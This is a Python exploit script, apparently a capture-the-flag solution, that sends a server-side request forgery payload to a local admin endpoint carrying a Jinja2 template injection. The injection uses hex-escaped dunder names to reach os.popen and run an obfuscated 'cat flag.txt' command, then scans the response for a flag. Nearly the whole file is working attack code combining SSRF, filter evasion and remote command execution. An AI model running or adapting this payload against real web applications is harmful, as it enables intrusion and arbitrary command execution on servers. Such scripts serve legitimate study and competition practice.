#!/usr/bin/env python3

import re
import sys
import requests

TARGET = "https://example.com/fetch"
TIMEOUT = 10.0

# Build payload: keep the literal \x.. sequences (so the server receives them exactly)
payload_value = (
    "http://127.0.0.1:8000/admin?template={{"
    "request['application']['\\x5f\\x5fglobals\\x5f\\x5f']"
    "['\\x5f\\x5fbuiltins\\x5f\\x5f']"
    "['\\x5f\\x5fimport\\x5f\\x5f']('os')"
    "['popen']('\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74')"
    "['read']()"
    "}}"
)

data = {
    # form field 
    "url": payload_value
}

headers = {
    "Host": "exampple.com",
    "Allow": "true", #this header must be ...
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://example.com",
    "Referer": "https://example.com/fetch",
    "Upgrade-Insecure-Requests": "1",
    "Dnt": "1",
    "Sec-Gpc": "1",
}

def extract_flag(text):
  
    patterns = [r"sun\{.*?\}"]
    for p in patterns:
        m = re.search(p, text, flags=re.IGNORECASE | re.DOTALL)
        if m:
            return m.group(0)
    return None

def main():
    s = requests.Session()
    try:
        resp = s.post(TARGET, headers=headers, data=data, timeout=TIMEOUT, allow_redirects=True, verify=True)
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}", file=sys.stderr)
        sys.exit(1)

    print("== HTTP", resp.status_code, "==")
   
    print(resp.text)

    flag = extract_flag(resp.text)
    if flag:
        print("\n== FLAG FOUND ==")
        print(flag)
    else:
        print("\n[!] No flag string found in response.")

if __name__ == "__main__":
    main()
